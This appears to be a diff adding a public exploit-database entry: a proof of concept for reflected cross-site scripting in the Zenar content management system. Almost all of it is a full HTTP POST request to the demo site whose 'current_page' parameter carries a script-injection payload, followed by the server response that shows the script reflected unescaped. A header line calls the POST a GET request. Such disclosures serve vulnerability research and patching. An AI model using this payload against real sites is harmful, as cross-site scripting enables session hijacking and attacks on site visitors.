@@ -1,0 +1,41 @@
+# Exploit Title: Zenar Content Management System - Cross-Site Scripting
+# Software Link: https://zenar.io/
+# Dork: N/A
+# Author: Berk Dusunur
+# Tested Website: http://demo.zenar.io
+# Date: 2018-05-20
+# Category: Web App
+
+# PoC
+
+# GET Request:
+
+POST /zenario/ajax.php?method_call=refreshPlugin&inIframe=true HTTP/1.1
+Host: demo.zenar.io
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/plain, */*; q=0.01
+Origin: http://demo.zenar.io
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Referer: http://demo.zenar.io/enquiries/newsletter-sign-up
+Accept-Language: en-us,en;q=0.5
+X-Scanner: Netsparker
+Cookie: PHPSESSID=27pdf3fd0plfnarmh5edk5es33
+Accept-Encoding: gzip, deflate
+Content-Length: 273
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+cID=25&slideId=3&cType=html&slotName=Slot_Main_2&instanceId=143&containerId=plgslt_Slot_Main_2&formPageHash=35263a7d5401cb22f77e67fb50fcdd99&reloaded=1&inFullScreen=3&field_14=netsparker%40example.com&current_page='"--></style></scRipt><scRipt>alert(EZK)</scRipt>
+
+# Response:
+
+<input type="hidden" name="formPageHash"
+value="35263a7d5401cb22f77e67fb50fcdd99"/><input type="hidden"
+name="reloaded" value="1"/><input type="hidden" name="inFullScreen"
+value="1"/><fieldset
+id="plgslt_Slot_Main_2_page_'"--></style></scRipt><scRipt>alert(EZK)</scRipt>"
+class="page_"><div class="form_fields"></div><div
+class="form_buttons"><input type="button" value=""
+class="next"/></div>
